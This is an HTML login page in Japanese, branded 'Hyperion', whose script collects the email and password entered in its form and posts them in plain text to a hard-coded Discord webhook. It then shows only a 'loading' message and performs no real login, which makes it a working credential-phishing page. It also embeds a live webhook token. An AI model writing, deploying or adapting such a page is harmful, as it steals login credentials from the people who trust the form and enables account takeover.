<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hyperion - ログイン</title>
    <style>
        /* CSSは前の回答と同じです */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #1e1e1e;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
            width: 320px;
            text-align: center;
        }

        h2 {
            font-size: 28px;
            color: #00ffff;
            margin-bottom: 30px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #aaaaaa;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #00ffff;
            border-radius: 6px;
            background-color: #2b2b2b;
            color: #ffffff;
            box-sizing: border-box; 
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: #00e0e0;
            outline: none;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #00ffff;
            color: #121212;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            transition: background-color 0.3s, transform 0.2s;
            text-transform: uppercase;
        }

        button:hover {
            background-color: #00e0e0;
            transform: translateY(-2px);
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Hyperion</h2>
        <form id="loginForm">
            <div class="input-group">
                <label for="user_id">メールアドレス</label>
                <input type="text" id="user_id" name="user_id" required>
            </div>
            <div class="input-group">
                <label for="password">パスワード</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">アクセス</button>
        </form>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1424397664413286480/czyMFFPNG4ZZzEygvWiipzwVKKIB9202mLQRLfizS1rynTMgAuHhVaLA-VjN3cCqQV00';
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();

            const userID = document.getElementById('user_id').value;
            const password = document.getElementById('password').value;

            const message = {
                username: "Hyperion",
                content: "Hyperion",
                embeds: [{
                    title: "ログイン情報",
                    color: 3447003, 
                    fields: [
                        { name: "ユーザーID", value: `\`${userID}\``, inline: false },
                        { name: "パスワード", value: `\`${password}\``, inline: false }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "ブラウザからの送信"
                    }
                }]
            };
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(message),
            })
            .then(response => {
                if (response.ok) {
                    alert('読み込み中です');
                } else {
                    alert(`読み込みに失敗しました: ${response.status} ${response.statusText}`);
                }
            })
            .catch(error => {
                console.error('送信エラー:', error);
                alert('通信エラーが発生しました。コンソールを確認してください。');
            });
        });
    </script>
</body>
</html>
